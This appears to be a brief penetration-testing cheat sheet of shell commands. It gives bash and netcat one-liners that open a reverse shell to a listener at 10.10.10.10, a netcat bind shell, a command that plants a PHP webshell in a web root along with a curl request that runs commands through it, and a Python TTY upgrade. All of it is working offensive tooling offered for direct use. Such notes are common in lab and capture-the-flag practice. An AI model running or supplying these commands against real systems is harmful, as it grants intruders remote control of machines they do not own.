# Shells

**Send reverse shell from remove server**
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
# OR
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f	
```

**Start a bind shell on the remote server**
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

# connect to the shell
nc 10.10.10.1 1234
```

***Create Webshell php file**
```bash
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php

# Execute command on an uploaded Webshell
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

**Upgrade Shell TTY**
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
`ctrl+z` then `stty raw -echo` then `fg` then `enter` twice	
